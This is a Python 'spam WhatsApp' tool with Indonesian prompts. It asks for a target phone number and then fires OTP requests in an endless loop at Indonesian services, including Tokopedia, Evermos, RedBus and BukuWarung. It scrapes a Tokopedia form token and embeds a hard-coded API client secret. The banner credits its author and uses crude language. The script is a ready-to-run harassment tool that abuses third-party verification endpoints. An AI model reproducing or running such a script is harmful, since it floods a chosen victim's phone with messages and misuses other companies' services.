#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

# Yang ambil Web Api Kontol
# Biasanya Yang Ambil Si Dark-02 wokwok:v
try:
    import os,sys,time
    import requests
    import json
    import re
    import colorama
    from requests import post,get
    from colorama import Fore,init,Back
except ModuleNotFoundError:
    print ("Module Belum Terinstall,Install Module Terlebih Dahulu")
    sys.exit()

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

def tanya():
    ya=input("\033[1;97mBack Tools\033[1;90m? \033[1;92m(\033[1;92my"+Fore.RED+"/\033[1;92mt\033[1;92m)"+Fore.RED+":\033[1;92m ")
    if ya == "y" or ya == "Y":
        banner()
        inputan()
    if ya == "t" or ya == "T":
        sys.exit()

def countdown(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(1)
			time_sec -= 1
		print (putih+"["+kuning+"•"+putih+"] Mulai Menyepam Ulang....           ")
		time.sleep(5)
	except KeyboardInterrupt:
                print (putih+"Program Terminated ["+Fore.RED+"!"+putih+"]")
                sys.exit()

Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def main():
    banner()
    nomor = input("\033[1;97m[\033[1;93m•\033[1;97m] Nomor Target "+kuning+"{\033[1;97mEx"+Fore.RED+"\033[1;92m:\033[1;96m8xx\033[1;93m} \033[1;96m»"+Fore.RED+"⟩\033[1;95m ")
    while True:
        try:
            req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
            gw=requests.get("https://m.redbus.id/api/getOtp?number="+nomor+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}).text
            site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text
            search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
            sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',})
            req=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
            shope=requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},json={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}).text
            reqw=requests.post("https://passport-api.orami.co.id/api/otp/send/",headers={"Host":"passport-api.orami.co.id","content-length":"46","accept":"application/json, text/plain, */*","content-type":"application/json","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://passport.orami.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://passport.orami.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"+62"+nomor,"method":"whatsapp"})).text
            pos=requests.post("https://gaia.mysirclo.id/graphql",headers={"Host":"gaia.mysirclo.id","Connection":"keep-alive","Content-Length":"280","accept":"*/*","content-type":"application/json","sec-ch-ua-mobile":"?0","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","Origin":"https://store.sirclo.com","Sec-Fetch-Site":"cross-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://store.sirclo.com/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"requestPhoneOtp","variables":{"input":{"brandId":"dummy","subject":"0"+nomor,"taskId":"admin-phone-register"}},"query":"mutation requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"})).text
            pos=requests.post("https://tokotalk-api.eks.codebrick.io/v1/no_auth/verifications",headers={"Host":"tokotalk-api.eks.codebrick.io","Connection":"keep-alive","Content-Length":"110","Accept":"application/json, text/plain, */*","Content-Type":"application/json","sec-ch-ua-mobile":"?0","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","Origin":"https://tokoadmin.tokotalk.com","Sec-Fetch-Site":"cross-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://tokoadmin.tokotalk.com/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"optional":"2ca871a4375bd0af28d6381376167418","key":"phone","preferredMethod":"wa","value":"+620"+nomor})).text
            gas=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko","sec-ch-ua-platform":"Linux","origin":"https://web.tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
            req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
            autoketik(putih+"["+Hijau+"✓"+putih+"] Sukses Sending Spam WhatsApp To Number \033[1;93m"+nomor)
            countdown(190)
        except KeyboardInterrupt:
            tanya()
        except requests.exceptions.ConnectionError:
            exit('\033[0;37m[\033[0;31m!\033[0;37m] \033[0;37mKoneksi Internet Error')
    
def banner():
    ip=requests.get('https://api.ipify.org').text
    os.system("clear")
    autoketik("""
\033[1;96m╔╦╗\033[1;97m┌─┐┌─┐┬  ┌─┐   \033[1;92m╦ ╦\033[1;97m┌─┐ | \033[1;96mPastikan Lu Udah Subrek
 \033[1;96m║ \033[1;97m│ ││ ││  └─┐"""+Fore.RED+"""───\033[1;92m║║║\033[1;97m├─┤ | \033[1;96mSebelum Recode Toolsnya ajg
 \033[1;96m╩ \033[1;97m└─┘└─┘┴─┘└─┘   \033[1;92m╚╩╝\033[1;97m┴ ┴ | Powered \033[1;96mExecuted Team""")
    print(abu + '-' * os.get_terminal_size().columns, end=''*2)
    print (Fore.RED+""" • \033[1;97mCreator"""+Fore.RED+""" : \033[1;92mAmmar-Executed""")
    print (Fore.RED+""" • \033[1;97mGithubb"""+Fore.RED+""" : \033[1;92mgithub.com/AmmarrBN""")
    print (Fore.RED+""" • \033[1;97mYour Ip"""+Fore.RED+""" : \033[1;92m"""+ip)
    print(abu + '-' * os.get_terminal_size().columns, end=''*2)

def banner2():
    print ("\033[1;97m 1"+Fore.RED+".\033[1;97mMulai \033[1;92mSpam"+ungu+" 24 Jam Non Stop")
    print ("\033[1;97m 2"+Fore.RED+".\033[1;97mLaporkan \033[1;93mBug")
    print ("\033[1;97m 3"+Fore.RED+".Exit \033[1;97mTools")
    print(abu + '-' * os.get_terminal_size().columns, end=''*2)

def inputan():
    banner2()
    modepesawat=input("\033[1;97m[\033[1;93m•\033[1;97m] Pilih Menu Tools \033[1;96m»"+Fore.RED+"⟩\033[1;95m ")
    if modepesawat == "1":
        main()
    if modepesawat == "2":
        os.system("xdg-open https://instagram.com/ammarexecuted")
        tanya()
    if modepesawat == "3":
        time.sleep(3)
        print ("\033[1;97m["+Fore.RED+"!\033[1;97m] Berhasil Keluar Dari Tools")
        sys.exit()
    if modepesawat > "3":
        print (putih+"Tolong Masukan Pilihan Dengan Benar"+Fore.RED+" !!!!!")
    
banner()
inputan()
